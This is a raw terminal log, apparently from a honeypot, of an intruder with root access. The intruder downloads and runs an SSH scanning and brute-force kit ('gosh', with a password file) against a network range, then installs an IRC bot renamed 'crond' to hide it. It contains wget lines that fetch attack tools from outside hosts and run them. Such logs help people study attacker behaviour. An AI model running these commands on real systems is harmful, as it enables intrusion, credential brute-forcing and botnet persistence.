@@ -1,0 +1,101 @@
+[4hAWSWeb:~# w
+[4l 09:57:04 up 107 days, 12:0,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    79.113.248.146    09:56    0.09   0.05   0.05 w
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# cd /var/tmp
+[4l[4hAWSWeb:/var/tmp# ls
+[4l[4hAWSWeb:/var/tmp# la [1D[1P[1D[1Ps -a
+[4l.  .. 
+[4hAWSWeb:/var/tmp# wget http://sorinel.webs.com/gosh.tar
+[4l--2013-05-12 09:57:39--  http://sorinel.webs.com/gosh.tar
+Connecting to sorinel.webs.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1652618 (1M) [application/x-tar]
+Saving to: `gosh.tar
+
+ 0% [>                                      ] 1,134        14K/s  eta 1m 51s32% [============>                          ] 538,014      916K/s  eta 1s   62% [========================>              ] 1,025,754    917K/s  eta 0s64% [=========================>             ] 1,061,754    603K/s  eta 0s66% [=========================>             ] 1,095,654    425K/s  eta 1s68% [==========================>            ] 1,133,034    354K/s  eta 1s70% [===========================>           ] 1,169,034    304K/s  eta 1s72% [============================>          ] 1,196,034    267K/s  eta 1s74% [=============================>         ] 1,232,754    240K/s  eta 1s76% [=============================>         ] 1,268,034    220K/s  eta 1s78% [==============================>        ] 1,289,514    201K/s  eta 1s80% [===============================>       ] 1,331,034    189K/s  eta 1s82% [================================>      ] 1,365,654    177K/s  eta 1s84% [================================>      ] 1,394,754    167K/s  eta 1s86% [=================================>     ] 1,430,754    159K/s  eta 1s88% [==================================>    ] 1,463,274    149K/s  eta 1s90% [===================================>   ] 1,502,754    144K/s  eta 1s93% [====================================>  ] 1,538,034    139K/s  eta 0s94% [====================================>  ] 1,565,034    134K/s  eta 0s96% [=====================================> ] 1,595,514    129K/s  eta 0s99% [======================================>] 1,637,754    126K/s  eta 0s100%[======================================>] 1,652,618    126K/s
+
+2013-05-12 09:57:52 (126 KB/s) - `gosh.tar' saved [1652618/1652618]
+[4hAWSWeb:/var/tmp# tar xzvf gosh.tar
+[4lgosh
+gosh/pass_file
+gosh/ss
+gosh/gen-pass.sh
+gosh/vuln.txt
+gosh/mfu.txt
+gosh/2
+gosh/a
+gosh/scam
+gosh/go.sh
+gosh/common
+gosh/3
+gosh/sshd
+gosh/5
+gosh/ssh-scan
+gosh/4
+gosh/1
+gosh/pscan2
+gosh/secure
+[4hAWSWeb:/var/tmp# rm -rf gosh.tgz
+[4l[4hAWSWeb:/var/tmp# cd gosh
+[4l[4hAWSWeb:/var/tmp/gosh# chmod +x *
+[4l[4hAWSWeb:/var/tmp/gosh# ./go.sh 137
+[4lscanning network 137.*
+usec: 30000, burst packets 50
+using interface eth0
+using "(tcp[tcpflags]=0x12) and (src port 22) and (dst port 15232)" as pcap filter
+my detected ip on eth0 is 127.0.0.1
+capturing process started pid 2259
+Toata [31mdragostea[0m mea pentru [32mdiavola[0m!!!!!!
+[4hAWSWeb:/var/tmp/gosh# cd 
+[4l[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /var.[1D[1P/tmp
+[4l[4hAWSWeb:/var/tmp# la
+bash: la: command not found
+AWSWeb:/var/tmp# ls
+[4lgosh.tar gosh     
+[4hAWSWeb:/var/tmp# rm -rf gosh.tar
+[4l[4hAWSWeb:/var/tmp# [Krm -rf gosh.tar[1D[1P[1D[1P[1D[1P[1D[1P
+[4l[4hAWSWeb:/var/tmp# wget http://X.hackersoft.org/emech/emech-linux.tgz
+[4l--2013-05-12 09:59:04--  http://X.hackersoft.org/emech/emech-linux.tgz
+Connecting to X.hackersoft.org:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 278625 (272K) [application/x-gzip]
+Saving to: `emech-linux.tgz
+
+ 0% [>                                      ] 1,243        15K/s  eta 17s100%[======================================>] 278,625      15K/s
+
+2013-05-12 09:59:04 (15 KB/s) - `emech-linux.tgz' saved [278625/278625]
+[4hAWSWeb:/var/tmp# tar zxvf emech-linux.tgz
+[4lcrond
+crond/LinkEvents
+crond/xh
+crond/crontab
+crond/r
+crond/r/rsignoff.e
+crond/r/rversions.e
+crond/r/rnicks.e
+crond/r/rinsult.e
+crond/r/rsay.e
+crond/r/rtsay.e
+crond/r/rpickup.e
+crond/r/raway.e
+crond/r/rkicks.e
+crond/start
+crond/m.help
+crond/autorun
+crond/run
+crond/mech.dir
+crond/inst
+[4hAWSWeb:/var/tmp# rm -rf emech-linux.tgz
+[4l[4hAWSWeb:/var/tmp# cd crond
+[4l[4hAWSWeb:/var/tmp/crond# chmod +x *
+[4l[4hAWSWeb:/var/tmp/crond# ./start x69
+[4l=====>Created by PuFoS<=====
+++++++ *Asta e o arhiva privata*  ++++++++
+Exemplu : ./start canal 
+P.S : FARA DIEZ!
+[4hAWSWeb:/var/tmp/crond# 
